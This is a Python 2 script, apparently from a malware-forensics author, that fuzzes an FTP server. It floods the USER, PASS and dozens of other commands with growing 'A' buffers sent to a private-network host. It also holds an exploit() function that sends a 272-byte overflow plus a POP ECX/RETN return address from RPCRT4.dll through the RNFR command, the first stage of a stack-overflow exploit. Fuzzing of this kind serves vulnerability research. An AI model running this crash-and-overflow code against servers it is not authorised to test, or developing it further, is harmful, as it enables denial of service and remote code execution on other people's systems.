#!python
###############################################
#   FTP Fuzzer				      #
#   Author: malwrforensics                    #
#   Conact: malwr at malwrforensics dot com   #
###############################################

import socket
import time

MIN_LIMIT = 50
MAX_LIMIT = 1050

def send_command(s, command, buffer):
	s.send(command + ' ' + buffer + '\r\n')
	s.recv(2050)

def fuzz_user(server):
	global MIN_LIMIT
	global MAX_LIMIT
	print "Fuzz USER"
	for length in range(MIN_LIMIT,MAX_LIMIT):
		print "USER length: " + str(length) + "\n"
		buffer = '\x41' * length
		s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
		connect = s.connect((server, 21))
		s.recv(1024)
		send_command(s, 'USER', buffer)
		s.send('PASS anonymous\r\n')
		s.recv(1024)
		s.shutdown(socket.SHUT_RDWR)
		s.close()

def fuzz_pass(server):
	global MIN_LIMIT
	global MAX_LIMIT
	print "Fuzz PASS"
	for length in range(MIN_LIMIT,MAX_LIMIT):
		print "PASS length: " + str(length) + "\n"
		buffer = '\x41' * length
		s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
		connect = s.connect((server, 21))
		s.recv(1024)
		s.send('USER anonymous\r\n')
		s.recv(1024)
		send_command(s, 'PASS', buffer)
		s.shutdown(socket.SHUT_RDWR)
		s.close()

def fuzz(server, command):
	global MIN_LIMIT
	global MAX_LIMIT
	print "Fuzz " + str(command[:10])
	for length in range(MIN_LIMIT,MAX_LIMIT):
		print str(command[:10]) + " length: " + str(length) + "\n"
		buffer = '\x41' * length
		s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
		connect = s.connect((server, 21))
		s.recv(1024)
		s.send('USER anonymous\r\n')
		s.recv(1024)
		s.send('PASS anonymous\r\n')		
		s.recv(1024)
		send_command(s, command, buffer)
		s.shutdown(socket.SHUT_RDWR)
		s.close()
	time.sleep(5)	#sleep to close the active connections

def exploit(server, command):
	print "Fuzz " + command
	length = 272
	buffer = '\x41' * length
	#0x779be871,  # POP ECX # RETN [RPCRT4.dll] 
	buffer += '\x71\xe8\x9b\x77'
	s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
	connect = s.connect((server, 21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')		
	s.recv(1024)
	send_command(s, command, buffer)
	s.close()


### MAIN ###
myserver = '192.168.205.103'
#fuzz_user(myserver)
#fuzz_pass(myserver)
#fuzz(myserver, 'ABOR')
#fuzz(myserver, 'ACCT')
#fuzz(myserver, 'ALLO')
#fuzz(myserver, 'APPE')
#fuzz(myserver, 'CWD')
#fuzz(myserver, 'DELE')
#fuzz(myserver, 'DIR')
#fuzz(myserver, 'FORM')
#fuzz(myserver, 'GET')
#fuzz(myserver, 'HELP')
#fuzz(myserver, 'LIST')
#fuzz(myserver, 'MACDEF')
#fuzz(myserver, 'MDELETE')
#fuzz(myserver, 'MDIR')
#fuzz(myserver, 'MGET')
#fuzz(myserver, 'MKD')
#fuzz(myserver, 'MLS')
#fuzz(myserver, 'MODE')
#fuzz(myserver, 'MODETIME')
#fuzz(myserver, 'MPUT')
#fuzz(myserver, 'NEWER')
#fuzz(myserver, 'NLST')
#fuzz(myserver, 'NMAP')
#fuzz(myserver, 'MTDM')
#fuzz(myserver, 'NTRANS')
#fuzz(myserver, 'PUT')
#fuzz(myserver, 'RECV')
#fuzz(myserver, 'REGET')
#fuzz(myserver, 'REMOTEHELP')
#fuzz(myserver, 'REMOTESTATUS')
#fuzz(myserver, 'REST')
#fuzz(myserver, 'RESTART')
#fuzz(myserver, 'RETR')
#fuzz(myserver, 'RMD')
#fuzz(myserver, 'RNFR')
##exploit(myserver, 'RNFR')
#fuzz(myserver, 'RNTO')
#fuzz(myserver, 'QUOTE')
#fuzz(myserver, 'SEND')
#fuzz(myserver, 'SITE')
#fuzz(myserver, 'SIZE')
#fuzz(myserver, 'STAT')
#fuzz(myserver, 'STOR')
#fuzz(myserver, 'STRU')
#fuzz(myserver, 'UMASK')
#fuzz(myserver, 'TYPE')

#fuzz commands
#for length in range(MIN_LIMIT,MAX_LIMIT):
#	buf = '\x41' * length
#	fuzz(myserver, buf)
